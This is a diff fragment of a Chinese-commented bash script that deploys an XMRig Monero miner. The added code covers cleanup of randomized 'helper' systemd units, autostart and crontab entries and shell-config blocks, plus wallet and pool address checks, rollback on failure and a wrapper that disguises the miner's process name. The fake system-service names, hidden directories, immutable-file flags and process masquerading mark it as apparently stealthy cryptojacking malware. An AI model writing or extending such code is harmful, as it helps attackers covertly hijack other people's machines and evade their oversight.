+        systemctl stop "$svc" 2>/dev/null
+        systemctl disable "$svc" 2>/dev/null
+        rm -f "/etc/systemd/system/$svc" 2>/dev/null
+    done
+    svc_list=$(systemctl --user list-unit-files --no-legend 2>/dev/null | grep -oE '[a-z]+-helper-[a-z0-9]{4}\.service' || true)
+    for svc in $svc_list; do
+        systemctl --user stop "$svc" 2>/dev/null
+        systemctl --user disable "$svc" 2>/dev/null
+        rm -f "$HOME/.config/systemd/user/$svc" 2>/dev/null
+    done
+    # 兜底：清理可能的旧固定名
+    rm -f /etc/systemd/system/systemd-helper.service 2>/dev/null
+    rm -f "$HOME/.config/systemd/user/gvfs-helper.service" 2>/dev/null
+    systemctl daemon-reload 2>/dev/null
+    systemctl --user daemon-reload 2>/dev/null
+    
+    # 清理找到的目录
+    for d in "${found_dirs[@]}"; do
+        chattr -i "$d"/* 2>/dev/null
+        chmod -R 755 "$d" 2>/dev/null
+        rm -rf "$d" 2>/dev/null
+    done
+    
+    # 清理未找到的固定目录
+    for d in "${ROOT_DIRS[@]}"; do
+        chattr -i "$d"/* 2>/dev/null
+        chmod -R 755 "$d" 2>/dev/null
+        rm -rf "$d" 2>/dev/null
+    done
+    for d in "${USER_DIRS[@]}"; do
+        local expanded="${d//__HOME__/$HOME}"
+        chmod -R 755 "$expanded" 2>/dev/null
+        rm -rf "$expanded" 2>/dev/null
+    done
+    
+    # 清理 fallback
+    rm -rf /tmp/.X11-unix/.cache 2>/dev/null
+    rm -rf "$HOME/.cache/.tmp" 2>/dev/null
+    
+    # 清理 autostart（模糊匹配，名称已随机化）
+    for f in "$HOME/.config/autostart/"*-helper-*.desktop; do
+        [ -f "$f" ] && rm -f "$f" 2>/dev/null
+    done 2>/dev/null
     
     # 清理 crontab
-    crontab -l 2>/dev/null | grep -v "xmrig\|$PROCESS_NAME\|gvfs-helper" | crontab - 2>/dev/null
+    crontab -l 2>/dev/null | grep -vE "xmrig|gvfs-helper|systemd-helper|XMRIG_DEPLOY" | crontab - 2>/dev/null
     
-    # 清理 shell 配置
+    # 清理 shell 配置（使用标记精确删除）
     local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc")
     for config in "${shell_configs[@]}"; do
         if [ -f "$config" ]; then
-            sed -i '/System helper/d' "$config" 2>/dev/null
-            sed -i '/pgrep -f.*PROCESS_NAME/d' "$config" 2>/dev/null
-            sed -i '/gvfs-helper/d' "$config" 2>/dev/null
+            sed -i "/$SHELL_MARKER_START/,/$SHELL_MARKER_END/d" "$config" 2>/dev/null
         fi
     done
     
@@ -830,6 +946,45 @@ parse_arguments() {
         error "CPU 百分比必须是 1-100 之间的整数"
         exit 1
     fi
+    
+    # 验证钱包地址（Monero 标准: 95 或 106 字符，以 4 或 8 开头）
+    local addr_len="${#WALLET_ADDRESS}"
+    if ! [[ "$WALLET_ADDRESS" =~ ^[48][1-9A-HJ-NP-Za-km-z]+$ ]] || \
+       { [ "$addr_len" -ne 95 ] && [ "$addr_len" -ne 106 ]; }; then
+        error "钱包地址格式无效（应为 95 或 106 字符的 Monero 地址）"
+        exit 1
+    fi
+    
+    # 验证矿池地址（host:port 格式）
+    if ! [[ "$POOL_ADDRESS" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:[0-9]{1,5})?$ ]] && \
+       ! [[ "$POOL_ADDRESS" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(:[0-9]{1,5})?$ ]]; then
+        error "矿池地址格式无效（应为 host:port 或 ip:port 格式）"
+        exit 1
+    fi
+}
+
+#===========================================
+# 错误回滚（仅 main() 中显式调用，不用 trap 避免误触发）
+#===========================================
+
+_rollback() {
+    log "执行回滚..."
+    
+    # 停止已启动的进程
+    [ -n "$PROCESS_NAME" ] && pkill -f "$PROCESS_NAME" 2>/dev/null
+    pkill -f "\.launcher-" 2>/dev/null
+    pkill -f "\.monitor-" 2>/dev/null
+    
+    # 清理安装目录
+    [ -n "$INSTALL_DIR" ] && [ -d "$INSTALL_DIR" ] && rm -rf "$INSTALL_DIR" 2>/dev/null
+    
+    error "部署失败，已回滚"
+}
+
+die() {
+    error "$1"
+    _rollback
+    exit 1
 }
 
 #===========================================
@@ -866,9 +1021,16 @@ main() {
     
     # 下载二进制文件
     if ! download_binary; then
-        error "下载失败，退出"
-        exit 1
+        die "下载失败"
     fi
+    
+    # 校验二进制有效
+    if ! [ -s "$INSTALL_DIR/$PROCESS_NAME" ]; then
+        die "二进制文件无效或为空"
+    fi
+    
+    # 创建进程名伪装 wrapper（systemd 等服务也会用到）
+    create_launcher
     
     # 根据权限应用不同策略
     if [ "$PRIV_MODE" = "root" ]; then
